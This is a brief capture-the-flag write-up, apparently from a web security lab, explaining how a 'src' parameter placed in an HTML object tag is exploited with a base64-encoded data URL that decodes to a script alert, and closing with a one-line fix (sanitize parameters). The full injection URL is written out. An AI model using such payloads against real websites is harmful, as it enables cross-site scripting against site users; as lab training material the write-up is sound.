In this exploit we have a page like so index.php?page=media&src=nsa

and with a little bit of testing we found that src=nsa is put in object in html, so we change nsa for base64 like so http://10.211.55.61/?page=media&src=data:text/html;base64,PHNjcmlwdD5hbGVydCgncHduZCcpPC9zY3JpcHQ+

PHNjcmlwdD5hbGVydCgncHduZCcpPC9zY3JpcHQ+ is <script>alert('pwnd')</script>

and we got the flag

the solution to protect this kind of flaw is to sanitize parameters and check if its a legitimate param
